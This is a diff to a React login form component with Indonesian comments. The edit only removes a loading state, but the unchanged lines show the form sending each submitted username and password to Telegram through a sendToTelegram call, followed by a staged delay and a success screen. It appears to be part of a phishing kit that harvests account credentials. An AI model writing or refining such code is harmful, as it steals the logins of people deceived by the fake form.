@@ -16,7 +16,6 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
   const [idError, setIdError] = useState(false);
   const [pwError, setPwError] = useState(false);
   
-  const [loading, setLoading] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
 
   // Handle Input Number Only for User ID
@@ -57,9 +56,6 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
 
     if (!ok) return;
 
-    // DIRECT SUBMIT (Skipping verification)
-    setLoading(true);
-
     // Kirim ke Telegram (Tanpa pertanyaan verifikasi)
     const success = await sendToTelegram(username, password, "ID Login", "-");
     
@@ -70,7 +66,6 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     // Delay 5 detik sebelum muncul alert sukses/gagal
     setTimeout(() => {
       setShowCustomLoading(false);
-      setLoading(false);
       
       if (success) {
         setStep(3); // Show Success Modal
